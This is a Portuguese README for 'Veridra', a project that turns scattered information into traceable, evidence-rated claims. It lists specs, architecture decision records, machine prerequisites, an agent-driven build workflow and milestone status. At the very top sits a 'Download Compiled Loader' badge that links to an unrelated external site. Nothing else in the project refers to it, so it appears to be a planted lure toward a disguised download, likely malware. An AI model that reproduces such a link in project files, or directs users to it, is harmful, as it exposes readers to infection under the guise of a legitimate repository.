# Veridra

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Este repositório contém o projeto ativo do Veridra.

O produto se chama **Veridra**. O diretório/repositório usa `veridra2` para separar este projeto
ativo do projeto histórico em `/Users/rneigenfind/projetos/veridra`, que permanece apenas como
referência.

Em uma frase:

> O Veridra transforma informação dispersa em uma base qualificada de afirmações: cada afirmação pode ser rastreada até sua origem, avaliada por evidências, classificada por confiabilidade, revisada e reutilizada em conversas, relatórios, wikis, grafos e outros consumíveis.

A tese completa do produto está em `docs/000-project-brief.md`.

## Leitura Principal

- `AGENTS.md` — regras operacionais para agentes que forem trabalhar neste repositório.
- `docs/000-project-brief.md` — resumo executivo, tese e modelo mental do produto.
- `docs/001-product-principles.md` — princípios duráveis de produto.
- `docs/002-glossary.md` — vocabulário do domínio.
- `docs/003-product-trajectory.md` — trajetória intencional em 4 fases (MVP 1 local solo / MVP 2
  VPS fechado para amigos / pós-MVP local robusto modelo Obsidian / futuro distante grafo coletivo).
- `docs/specs/000-spec-process.md` — processo de specs.
- `docs/specs/021-veridra-v2-product.md` — spec de produto: identidade, persona, escopo do MVP,
  limites pós-MVP, fluxos, riscos e métricas.
- `docs/specs/022-veridra-v2-mvp-contract.md` — contrato técnico do MVP: objetos de domínio,
  invariantes, critérios obrigatórios, Avaliador de Confiabilidade, dados, critérios testáveis e modos de falha.
- `docs/specs/023-harness-extracao-afirmacoes.md` — spec do harness LLM de extração de afirmações:
  schemas de I/O, validações determinísticas, fixtures, datasets de avaliação, limites operacionais e
  logging. `accepted` v0.2 em 2026-04-29; emendada para v0.3 em 2026-04-30 (consolidação
  documental pré-execução: localização canônica de prompts harmonizada com ADR 0007, `support_role`
  no schema de output, §Logging integrada com ADR 0009, §Modos de Falha 429/5xx fechados).
- `docs/specs/024-mvp-implementation-plan.md` — plano de implementação do MVP: sequência de
  milestones M0-M6, PRs por milestone, checkpoints onde cada bloqueio se dissolve. Define o
  critério de transição da fase de Harness setup para a fase de Execução. `accepted` v0.1 em
  2026-04-29; emendada para v0.2 em 2026-04-30 (PR0 de quality gates a M1) e v0.3 em 2026-04-30
  (caminho de prompt em M3 PR9 corrigido).
- `docs/specs/025-lints-and-invariants.md` — catálogo central de invariantes do Veridra que devem
  virar lint mecânico durante M1-M3 (10 itens `VLINT-001` a `VLINT-010`). `accepted` v0.1 em
  2026-04-30.
- `docs/adr/` — Architecture Decision Records (ver `docs/adr/README.md` para a fila oficial).

## Pré-requisitos de Máquina

Para rodar o Veridra localmente (a partir de M1 PR1):

- **macOS** (Roberto roda no Mac; outros sistemas pós-MVP).
- **Docker Desktop** ≥ 4.x — Postgres roda via Docker Compose ([ADR 0001](docs/adr/0001-stack-and-local-architecture.md)).
- **Node.js** 20.x LTS (ou superior compatível) — runtime principal.
- **pnpm** 10.x — package manager ([ADR 0001](docs/adr/0001-stack-and-local-architecture.md)). Versão fixada em `package.json#packageManager` (`pnpm@10.33.2` no momento) e usada via Corepack.
- **Git** ≥ 2.30 — controle de versão.
- **ChatGPT Pro $200/mês** com **Codex Mac app** instalado e logado — único executor de código autônomo ([ADR 0011](docs/adr/0011-agent-orchestration.md)).

Comandos de verificação:

```bash
docker --version    # ≥ 4.x
node --version      # v20.x ou superior
pnpm --version      # 10.x (Corepack alinha com package.json#packageManager)
git --version       # 2.30+
```

Variáveis de ambiente: copiar `.env.example` para `.env` e ajustar (BYOK keys, portas, `DATABASE_URL`).

## Como começar (Codex)

A primeira sessão de Codex começa em **M1 PR1 — Monorepo skeleton** ([Plan.md §M1 PR1](Plan.md)). Roberto:

1. Abre Codex Mac app.
2. Aponta para a pasta do projeto: `/Users/rneigenfind/projetos/veridra2`.
3. Codex carrega no startup: `AGENTS.md`, `Prompt.md`, `Plan.md`, `Implement.md`, `Documentation.md` + qualquer ADR/spec linkada.
4. Roberto envia o "go" — uma frase como _"Comece M1 PR1 conforme Plan.md."_
5. Codex executa autonomamente até fechar o milestone (per [ADR 0011 §Checkpoint por Milestone](docs/adr/0011-agent-orchestration.md)).
6. Roberto valida em ~10–15min cada milestone fechado e libera o próximo.

Sem intervenção entre checkpoints, salvo bloqueio sinalizado por Codex (issue + status `blocked` no PR + entrada no exec journal).

## Propostas e Referências

Para o índice completo de propostas exploratórias e o **backlog informal de ideias** para o futuro do Veridra, ver [`docs/reference/proposals/README.md`](docs/reference/proposals/README.md). Lá ficam: tabela de propostas formais com status e escopo, lugar para registrar ideias soltas em uma frase, e a convenção de quando uma ideia vira proposta formal numerada. Resumo das propostas atuais abaixo:

- `docs/reference/proposals/003-scorer.md` — proposta crítica de evolução do Avaliador de
  Confiabilidade. **Curada em 2026-04-29**: Extensão 1 (sinais determinísticos no Perfil de
  fonte/evidência) incorporada via emenda em ADR 0003; Extensão 2 (consenso multi-LLM) e demais
  itens diferidos para v1.0 de 023 ou pós-MVP. Documento permanece como referência histórica.
- `docs/reference/proposals/004-ui-ux-strategy.md` — proposta de estratégia de UI/UX (direção
  mínima upfront + crítica IA multimodal iterativa). **Em hibernação até a Fase 3** (pós-MVP local
  robusto, distribuição pública); para Fases 1 e 2, direção visual mínima é estabelecida em
  [024 §Direção Visual para Fases 1 e 2](docs/specs/024-mvp-implementation-plan.md) — `linear.app`
  como referência primária + `attio.com` complementar, lib base shadcn.
- `docs/reference/proposals/005-direction-collective-graph-and-contribution.md` — direção
  exploratória pós-MVP para um eventual grafo coletivo opt-in. **Não autoriza nenhuma adição ao
  MVP.** Existe para impedir que decisões de schema/API/UX da fase de Execução fechem portas
  importantes por inércia. Promoção a ADR/spec só após MVP funcional e modelagem de tenancy
  aceita.
- `docs/reference/product-landscape-and-positioning.md` — comparação com notas, wikis, LLM Wiki,
  NotebookLM, RAG, jornalismo investigativo, eDiscovery, fact-checking, pesquisa acadêmica, grafos e
  consumíveis pós-MVP.
- `docs/reference/stack-architecture-lessons.md` — lições arquiteturais a considerar na revisão da
  ADR 0001.
- `docs/reference/historical-veridra.md` — limite e resumo do projeto histórico.
- `docs/reference/README.md` — índice dos documentos de referência.
- `docs/reference/imported-adr-drafts/` — drafts históricos de ADRs importados (`0006` a `0010`); material de referência para a sequência oficial limpa, não ADRs ativas.

## Status Atual

**Fase atual: Execução, M4 pending (Avaliador de Confiabilidade). M1, M2 e M3 fechados em 2026-05-05.** M3 fechou após PR #17 (`fix/m3-wire-real-llm-providers`) corrigir worker que tinha mock hardcoded em vez dos providers reais; validação manual paga rodada com OpenAI confirmou pipeline end-to-end (`gpt-5.4`, custo $0.0056, 2 afirmações extraídas). A transição da fase de Harness setup para a fase de Execução foi declarada em **2026-04-29**, após M0 do plano de implementação ser concluído (022 v1.0, 023 v0.2 e 024 v0.1 todos aceitos). A sub-fase **M0.5 Initializer** executou de **2026-05-02 a 2026-05-04** com Claude Code no papel de initializer e Roberto aprovando arquivo por arquivo. Itens 1-9 do escopo M0.5 concluídos (estrutura monorepo, 5 quality gates + lefthook + CI, lints prioritários M1, exec journal seed `M1.md`, configuração Codex `.codex/config.toml`, 5 skills, arquivos-pivô raiz, plugins/MCPs do Codex Mac app, cost tracking + spend limits + max 2 CI rounds).

**O GO autônomo foi dado em 2026-05-04**: Codex Mac app passa a atuar como executor único a partir de **M1 — Scaffolding básico**, dentro da sequência de PRs definida em [024 §Milestones](docs/specs/024-mvp-implementation-plan.md). [ADR 0011](docs/adr/0011-agent-orchestration.md) promovida de `draft` para `accepted` como passo final do M0.5. Existência da fase Initializer evitou a circularidade de Codex construir o evaluator estrutural (5 quality gates) pelo qual ele próprio é julgado. Pattern de referência: initializer agent (Anthropic, "Effective harnesses for long-running agents"). Validação operacional final acontece nas primeiras sessões do Codex (sessão piloto + primeiro PR em CI); se algo crítico aparecer, M0.5 reabre via emenda à ADR 0011.

- `021` (spec de produto) **aceita em 2026-04-27**. Define identidade, persona, modos, fluxos
  do MVP, escopo, invariantes de produto, critérios de aceitação e métricas. As 6 questões em
  aberto foram diferidas ou resolvidas com cross-ref.
- `022` (contrato técnico do MVP) **aceita v1.0 em 2026-04-29**, **emendada para v1.0.1 em
  2026-04-30** (consolidação documental pré-execução: lista fechada de identificadores
  determinísticos alinhada com ADR 0003; nota sobre re-extração após descarte de conteúdo bruto).
  §Caminho de Aceitação distingue v1.0/v1.0.x (pré-implementação, atual) de v1.x
  (pós-primeiros-PRs, com aprendizado real).
- `023` (harness de extração) **aceita v0.2 em 2026-04-29**, **emendada para v0.3 em
  2026-04-30** (consolidação documental pré-execução: prompts em `prompts/<workflow>/`,
  `support_role` no schema, §Logging fechado com ADR 0009, 429/5xx com backoff exponencial). v1.0
  será consolidada pós-PRs M3-M6 com dados reais.
- `024` (plano de implementação do MVP) **aceita v0.1 em 2026-04-29**, **emendada duas vezes em
  2026-04-30**: para v0.2 (adicionado PR0 a M1 para implementar quality gates de ADR 0008;
  pré-condição de M1 estendida para depender de ADRs 0007-0009 e spec 025; PR1/PR4 atualizados
  para referenciar layout de ADR 0007 e portas configuráveis de ADR 0009); para v0.3 (caminho de
  prompt em M3 PR9 corrigido, alinhado com ADR 0007 e §M1 PR1). Define a sequência M0-M6 de
  milestones e PRs, mapeia cada checkpoint pendente de 022/023 a um milestone, e estabelece o
  critério de transição para fase de Execução. v1.0 será consolidada após M1-M2 com aprendizado
  real de granularidade.
- `025` (catálogo de lints e invariantes) **aceita v0.1 em 2026-04-30**. Lista 10 invariantes do
  Veridra (`VLINT-001` a `VLINT-010`) que devem virar lint mecânico durante M1-M3, com fonte de
  autoridade, prioridade por milestone e mensagem orientadora. Não define implementação concreta
  (cada lint vira PR próprio).
- ADR 0001 (stack e arquitetura local) foi **aceita em 2026-04-27**, **emendada duas vezes**
  (1, em 2026-04-29: PDF, transcrição de áudio e transcrição de vídeo são fora do MVP — Fases 1 e 2
  — e candidatos à Fase 3 conforme 003-product-trajectory; vocabulário "stretch/polish" substituído
  por "Fase 3" nas referências afetadas; lazy check de poppler/sharp migra para essa fase; 2, em
  2026-04-30: item 9 das §Decisões Resolvidas atualizado — IDs concretos dos modelos OpenAI/DeepSeek
  fixados em 022 §Setup Inicial). Decide TypeScript, Fastify, Vite + React + Tailwind, Postgres via
  Docker Compose, Drizzle como query layer, pg-boss, pnpm.
- ADR 0002 (semântica de aprovação automática e score de confiabilidade) foi **aceita em 2026-04-27**,
  **emendada em 2026-04-27** (cap 0.97 → 0.95; pesos do score migrados para escala 100-base
  conforme 022 emendada). Decide `approval_origin` separado, `workflow_version` no formato
  `YYYY.MM.DD-rN`, `score_breakdown` em JSONB, **cap 0.95** em componentes derivados de LLM, modelo
  peso × confiança e bloqueio de auto-aprovação para as 8 categorias sensíveis no MVP.
- ADR 0003 (avaliação de fonte e perfil curado) foi **aceita em 2026-04-27**, **emendada três vezes**
  (1, em 2026-04-27: extensão da §Restrição Permanente a `Claim`/`ClaimEvidence`/`Interpretation`/
  `EditorialDecision`/`HumanNote`; 2, em 2026-04-27: alinhamento com pesos 35/30/20/15 = 100 e cap
  0.95 — provisional contribui no máximo 33.25 = 35 × 0.95; 3, em 2026-04-29: incorporação parcial
  da [proposta 003-scorer](docs/reference/proposals/003-scorer.md) — Extensão 1 (sinais
  determinísticos no Perfil de fonte/evidência: idade do domínio via WHOIS, listas curadas com
  imprensa estabelecida protegida, padrões linguísticos no material) entra como subcomponentes do
  schema; lista protegida vira invariante anti-envenenamento; Extensão 2 multi-LLM permanece
  pós-MVP). Decide granularidade hybrid (campos por domínio vs URL), rating provisional capado em
  **0.95**, `is_primary_source` tri-state, lista MVP de identificadores determinísticos (DOI, ISBN,
  CNJ, lei/decreto BR), e **Restrição Permanente** contra publicação de ranking de fontes
  (motivação legal e estrutural — vale em todas as fases da trajetória, incluindo MVP 2 fechado).
- ADR 0004 (separação ClaimEvidence/Interpretation) foi **aceita em 2026-04-27**, **emendada em
  2026-04-27** (storage minimalista alinhado: `Material` content não persistido; `Trecho` deixa de
  ser tabela e vira conceito do harness; snapshot do texto fica inline em `ClaimEvidence`). Decide
  `claim_evidence` como tabela própria, `support_role` como enum de banco com 4 valores
  (`supports`/`reports`/`contextualizes`/`disputes`), snapshot inline obrigatório quando há trecho
  e **Invariante Estrutural** que separa Veridra de pipelines RAG (Interpretation não é evidência).
- ADR 0005 (storage de segredos BYOK) foi **aceita em 2026-04-27**, **emendada duas vezes**
  (1, em 2026-04-29: item 8 — 1 chave obrigatória no setup inicial, segunda opcional, pelo menos
  uma de OpenAI ou DeepSeek; razão: maioria dos usuários terá uma conta antes da outra, "sem
  fallback silencioso" já garante operação com uma chave só; 2, em 2026-04-30: §Modelo de Decisão e
  §Consequências harmonizados com item 8 — ocorrências de "2 chaves" como obrigatórias corrigidas
  para "1 chave obrigatória + 1 opcional"). Decide 3 camadas auto-detectadas (OS keyring → arquivo
  criptografado → env vars com warning), até 2 chaves de API (1 OpenAI ou 1 DeepSeek obrigatória,
  segunda opcional) cobrindo até 4 escolhas de modelo, desbloqueio uma vez por sessão e suspend
  granular por provedor em 401. Fluxo concreto de Onboarding em
  [021 §Onboarding](docs/specs/021-veridra-v2-product.md); comportamento técnico em
  [022 §Setup Inicial](docs/specs/022-veridra-v2-mvp-contract.md).

**ADRs aceitas (11 total):**

- `docs/adr/0001-stack-and-local-architecture.md` (`accepted` 2026-04-27, emendada 2026-04-29)
- `docs/adr/0002-automatic-approval-and-score-semantics.md` (`accepted` 2026-04-27, emendada 2026-04-27)
- `docs/adr/0003-source-evaluation-and-curated-profile.md` (`accepted` 2026-04-27, emendada três vezes — 2× em 2026-04-27 e 1× em 2026-04-29)
- `docs/adr/0004-claim-evidence-and-interpretation-separation.md` (`accepted` 2026-04-27, emendada 2026-04-27)
- `docs/adr/0005-byok-secret-storage.md` (`accepted` 2026-04-27, emendada 2026-04-29)
- `docs/adr/0006-schema-conventions.md` (`accepted` 2026-04-29) — UUID v7, `timestamptz` UTC, ISO 8601 com Z, `created_at`/`updated_at` por classe de objeto, snake_case SQL + camelCase TS + kebab-case-pt domínio.
- `docs/adr/0007-internal-architecture-and-providers.md` (`accepted` 2026-04-30) — camadas internas (Types → Config → Repo → Service → Runtime → UI) com dependência unidirecional, padrão Providers para cross-cutting (SecretProvider, LlmProvider, TelemetryProvider, ClockProvider, HttpProvider), monorepo pnpm com 4 packages (`shared`, `server`, `worker`, `web`), prompts versionados em `prompts/<workflow>/v<X.Y.Z>.md`.
- `docs/adr/0008-quality-gates.md` (`accepted` 2026-04-30) — 5 gates obrigatórios (format/lint/type-check/test/doc-link) bloqueando merge, locais (lefthook) e em CI (GitHub Actions Node 20), com configuração inicial de Prettier, ESLint flat config, TypeScript strict total, Vitest, e `scripts/check-docs.ts`.
- `docs/adr/0009-local-observability.md` (`accepted` 2026-04-30) — pino estruturado com redação automática de BYOK e Material content; `Interpretation.telemetry` em coluna JSONB no Postgres; métricas/traces fora do MVP (Fase 3); endpoint `GET /debug/interpretation/:id` em dev; portas e DB nomeáveis por env para suportar múltiplos worktrees em paralelo.
- `docs/adr/0010-no-llm-evaluator-mvp.md` (`accepted` 2026-04-30, emendada em 2026-04-30 para padronizar terminologia: "falso positivo" → "falso negativo" em §Critério para Reabrir trigger 1) — decisão deliberada de não usar evaluator LLM separado no MVP. Razões: validadores determinísticos cobrem extração; sensibilidade é hardblock (custo de erro assimétrico a favor da segurança); revisão humana opcional cumpre papel de evaluator. 3 triggers explícitos para reabrir pós-M6 com eval dataset real.

- `docs/adr/0011-agent-orchestration.md` (`draft` 2026-04-30, refatorada e emendada várias vezes; **promovida para `accepted` em 2026-05-04** como passo final do M0.5) — regime operacional de execução com **Codex Mac app como executor único** + Claude Code como planner separado (sob demanda); convenção Codex 4-arquivos (Prompt/Plan/Implement/Documentation na raiz, apontando para fontes canônicas); política de PR estrutural (substitui regra 2 do AGENTS.md), 4 operações manuais reservadas, **checkpoint por milestone** (Codex pausa ao fechar M<N>, Roberto valida em ~15min antes de liberar M<N+1>), exec journal append-only em `docs/exec-plans/active/M<N>.md`, configuração Codex pré-pactuada (GPT-5.5 Medium fixo, auto-edit, plugins Computer Use/Spreadsheet/GitHub, MCPs Playwright/Context7), 5 skills pré-configuradas em `.codex/skills/`, fase Initializer (M0.5) com 9 itens de escopo, cost tracking com spend limits.

**ADRs em draft:** nenhuma.
